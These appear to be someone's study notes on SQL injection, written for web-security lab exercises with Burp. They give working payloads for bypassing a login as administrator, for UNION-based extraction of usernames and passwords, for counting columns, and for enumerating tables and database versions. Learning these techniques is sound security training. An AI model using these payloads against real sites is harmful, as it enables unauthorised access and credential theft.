An vulnerability that makes an attacker to modify a sql query which the application provides to database.

The common places in queries for sql injection:
INSERT query - Value attribute

UPDATE query - WHERE values

SELECT query - table name or col name

SELECT query -ORDER BY clause

### Sample Injection :  OR 1=1--

```perl
https://insecure-website.com/products?category=Gifts'+OR+1=1--

-> causes

SELECT * FROM products WHERE category = 'Gifts' OR 1=1--' AND condition

In burp we need to put 
category = 'Gifts'+OR+1=1+--
-> + acts as separator of values primarily and as white space secondarily.
```

Provides data from all categories,  and don’t consider the condition

### Can avoid password with this query :

```perl
SELECT * FROM users WHERE username = 'administrator'--' AND password = ''

Query : (In burp)

username=administrator'+--
```

### SQL Injection : Union Attacks

Sometimes results of sql query are returned with application’s ui responses, here we can get data from other table in same database using UNION keyword of sql query.

```perl
SELECT a, b FROM table1 UNION SELECT c, d FROM table2

-> The number of columns on both table should be same and the datatypes of columns 
	 should be same.
```

We can find the number of columns of the db which parses the sql query by using “Order BY” clause.

```perl
' ORDER BY 1 --
' ORDER BY 2 --
' ORDER BY 3 --
```

When the web’s response differs from normal output/response, we can understand it is the limit of columns in the table. But here we will get http response, which may become blank/no output at some time due to db’s result. For this we use the alternative “ ‘ UNION SELECT NULL, NULL —

The thing is null will match with any data types of the column, and in maximum cases the response won’t be blank but will just add one extra row of null values with tables values to output.

```perl
'+UNION+SELECT+NULL,+NULL+--

-> in queries and remove all default values of the parameters, correct number of nulls 
will give 200 status code.

```

## **Database-specific syntax**

```sql
For oracle there is a built-in table, so we can use like this

' UNION SELECT NULL FROM DUAL--

-- should be followed by space.
```

### Finding column with specific database

```sql
' UNION SELECT 'a',NULL,NULL,NULL--
' UNION SELECT NULL,'a',NULL,NULL--

there by we can identify which column has string data type.
```

### We can find username, pw once we know the respective column names, column data types and number of columns:

```sql
' UNION SELECT username, password FROM users--
```

## **Retrieving multiple values within a single column**

```sql
' UNION SELECT username || '~' || password FROM users--

-> Concatenating two columns.
```

## **Examining the database in SQL injection attacks**

We need to find the version and type of db.

The table and column names it contains.

| Database type | Query |
| --- | --- |
| Microsoft, MySQL | `SELECT @@version` |
| Oracle | `SELECT * FROM v$version` |
| PostgreSQL | `SELECT version()` |

```sql
Sample code:
First find number of columns, then find data type then find this

'UNION SELECT @@version --

If -- this comment won't work, then go for #(different db different comments)
```

### Listing content of db:

Most dbs except Oracle have views to display the information.

```sql
SELECT table_name FROM information_schema.tables

--For displaying about tables info

SELECT column_name FROM information_schema.columns WHERE table_name = 'Users'
--For column names of specific table

Then select 
select coulmnname from tablename
```
